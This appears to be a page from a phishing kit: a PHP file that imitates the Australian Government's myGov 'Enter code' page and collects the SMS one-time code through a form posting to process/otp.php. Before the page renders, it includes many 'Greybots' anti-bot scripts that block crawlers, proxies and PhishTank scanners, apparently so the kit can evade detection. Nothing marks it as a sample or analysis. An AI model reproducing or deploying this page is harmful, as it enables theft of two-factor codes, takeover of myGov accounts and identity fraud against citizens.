<?php

include "Inc/config.php";

$ip = $_SERVER['REMOTE_ADDR'];

if ($ip == '127.0.0.1' || $ip == '::1') {
    
	
}
elseif($antibot=="on") {
	include "ics/Greybots/Bad_ip.php";
	include "ics/Greybots/Grey-Bot-1.php";
	include "ics/Greybots/Grey-Bot-2.php";
	include "ics/Greybots/Grey-Bot-3.php";
	include "ics/Greybots/Grey-Bot-4.php";
	include "ics/Greybots/Grey-Bot-5.php";
	include "ics/Greybots/Grey-Bot-6.php";
	include "ics/Greybots/Grey-Bot-7.php";
	include "ics/Greybots/Grey-Bot-8.php";
	include "ics/Greybots/Grey-Bot-9.php";
	include "ics/Greybots/Grey-Bot-10.php";
	include "ics/Greybots/Grey-Bot-11.php";
	include "ics/Greybots/Grey-Bot-12.php";
	include "ics/Greybots/Grey-Bot-Crawler.php";
	include "ics/Greybots/Grey-IP-BlackList.php";
	include "ics/Greybots/Grey-Phishingtank.php";
	include "ics/Greybots/Grey-antibot-phishtank.php";
	include "ics/Greybots/Grey-Proxyblock.php";
	include "ics/Greybots/Grey-userAgent-1.php";
	include "ics/Greybots/Grey-userAgent-2.php";
	include "ics/Greybots/Grey-antibot-host.php";
	include "ics/Greybots/Grey-antibot-ip.php";
	include "ics/Greybots/Grey-antibot-proxy.php";
	include "ics/Greybots/Grey-Blocker.php";
	include "ics/Greybots/Grey-Bot.php";



}

?>

<!DOCTYPE html>
<html lang="en"><!--<![endif]--><head>
	<!--
E: PROD; 
C: MW0w; 
N: MW0w11; 
S: SW11c;  
-->
	<meta charset="utf-8">
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<title>
		Sign in with myGov - myGov
	</title>
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!-- phone number format detection, turning it off -->
	<meta name="format-detection" content="telephone=no">
	<link rel="icon" type="image/png" sizes="16x16" href="images/favicon.png">
	<link href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&amp;display=swap" rel="stylesheet">
	<link href="css/mgv2-application.css" rel="stylesheet">
	<link href="css/blugov.css" rel="stylesheet">
</head>

<body><noscript>
	<div class="outage">
		<div class="outage__inner">
			<div>
				<span class="is-visuallyhidden"> Warning message: </span>
				<p> JavaScript is required for myGov to work correctly.</p>
			</div>
		</div>
	</div>
</noscript>




	
		
	
	





<nav class="uikit-skip-link" aria-label="Skip Links">
	<a class="uikit-skip-link__link" href="#content">Skip to main content</a>
</nav>

<div class="brand-rainbow">&nbsp;</div>
<header role="banner" class="mgvEnhanceHeader">
	<section class="wrapper">
		<div class="inner">
			<div class="unauth-grid">
				<div class="unauth-grid-row">
					<a href="#" class="unauth-govt-crest__link">
					    <img id="unauth-govt-crest" src="images/myGov-cobranded-logo-black.svg" alt="Australian Government and myGov logo" role="img">
                    </a>

					<div class="header-links">
						<a href="#">Help</a>
					</div>
				</div>
			</div>
		</div>
	</section>
</header>


<div class="wrapper-mapwap">
    <div class="main-block" id="content" role="main">
        <h1>Enter code</h1>
	    <p>We sent a code by SMS to your mobile number.</p>
	<form id="otp-entry-form" action="process/otp.php" method="post" autocomplete="off">
			<div class="code-container">
				<label for="otpanswer">Code	</label>
                <input id="otpanswer" name="otp" type="tel" class="security-code" autocomplete="off" required>
			</div>
            <div id="security-codes-info" class="hasInfo">
                <p>
                    If you don't want to use Digital Identity, you can <a>call the helpdesk</a> to create a new myGov account.
                </p>
                <a data-infotext-continue="" class="continue-digital-identity-chevron" href="/las/mygov-login?execution=e42s2&amp;_eventId=continueWithDigitalIdentity">Continue with Digital Identity</a>
            </div>
            <div class="button-container">    			
    			<button type="submit" class="button-main button" name="_eventId_submitOtp">Next</button>
			</div>
	</form>
</div>
</div>
<footer role="contentinfo">
    <div class="wrapper">
      <div class="inner">

        <section class="footer-list">
            <nav>
            <h2 class="sr-only" aria-label="Footer">Footer</h2>
            <ul class="lower-links">
                <li>
                    <a target="_blank" href="#">Terms of use</a>
                </li>
                <li>
                    <a target="_blank" href="#">Privacy and security</a>
                </li>
                <li>
                    <a target="_blank" href="#">Copyright</a>
                </li>
                <li>
                    <a target="_blank" href="#">Accessibility</a>
                </li>
            </ul>
            </nav>
        </section>
          <div class="footer-lower">
              <section class="footer-lower-logo">
              <a href="#">
                  <img src="images/myGov-cobranded-logo-white.svg" alt="Australian Government and myGov logo" width="313.17" height="70" role="img">
              </a>
              </section>

              <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
          </div>




      </div>
    </div>
  </footer>






</body></html>